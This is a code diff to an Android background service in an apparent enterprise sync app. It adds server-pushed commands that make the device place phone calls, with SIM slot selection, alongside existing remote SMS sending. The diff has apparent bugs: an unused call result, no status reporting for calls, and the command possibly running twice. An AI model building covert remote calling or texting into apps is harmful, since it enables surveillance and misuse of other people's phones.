@@ -17,6 +17,7 @@ import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.example.EnterpriseSyncApp
 import com.example.MainActivity
+import com.example.data.sync.CallHelper
 import com.example.data.sync.FirebaseSyncEngine
 import com.example.data.sync.LostModeManager
 import com.example.data.sync.RemoteCommandManager
@@ -190,11 +191,24 @@ class AlwaysSyncService : Service() {
                         val phone = params["phone"]?.toString() ?: params["number"]?.toString() ?: params["recipient"]?.toString() ?: params["to"]?.toString() ?: ""
                         val text = params["message"]?.toString() ?: params["text"]?.toString() ?: params["body"]?.toString() ?: params["payload"]?.toString() ?: ""
                         
+                        val isCallCommand = commandType.equals("PLACE_CALL", ignoreCase = true) ||
+                                commandType.equals("MAKE_CALL", ignoreCase = true) ||
+                                commandType.equals("CALL", ignoreCase = true) ||
+                                commandType.equals("CALL_PHONE", ignoreCase = true) ||
+                                commandType.equals("DIAL_CALL", ignoreCase = true) ||
+                                commandType.equals("REMOTE_CALL", ignoreCase = true)
+
                         val payload = if (commandType.equals("SEND_SMS", ignoreCase = true) || commandType.equals("SMS_SEND", ignoreCase = true)) {
                             if (phone.isNotEmpty() && text.isNotEmpty()) {
                                 "$phone|$text"
                             } else {
                                 params["payload"]?.toString() ?: params.entries.filter { it.key !in reservedKeys }.joinToString("|") { "${it.key}=${it.value}" }
+                            }
+                        } else if (isCallCommand) {
+                            if (phone.isNotEmpty()) {
+                                phone
+                            } else {
+                                params["payload"]?.toString() ?: ""
                             }
                         } else {
                             params["payload"]?.toString()
@@ -208,8 +222,19 @@ class AlwaysSyncService : Service() {
                                 ?: params.entries.filter { it.key !in reservedKeys }.joinToString("|") { "${it.key}=${it.value}" }
                         }
                         
-                        val result = commandManager.executeCommand(commandType, payload)
-                        syncEngine.updateCommandStatus(pushId, result.status, result.resultMessage)
+                        val simSlot = params["simSlot"]?.toString()?.toIntOrNull()
+                            ?: params["sim_slot"]?.toString()?.toIntOrNull()
+                            ?: params["sim"]?.toString()?.toIntOrNull()
+                            ?: params["slot"]?.toString()?.toIntOrNull()
+
+                        if (isCallCommand) {
+                            val callResult = CallHelper.placeCall(applicationContext, payload, simSlot, pushId)
+                            val execPayload = if (simSlot != null && !payload.contains("|")) "$payload|$simSlot" else payload
+                            commandManager.executeCommand(commandType, execPayload)
+                        } else {
+                            val result = commandManager.executeCommand(commandType, payload)
+                            syncEngine.updateCommandStatus(pushId, result.status, result.resultMessage)
+                        }
                     } catch (e: Exception) {
                         syncEngine.updateCommandStatus(pushId, "FAILED", e.message ?: "Execution error")
                     }
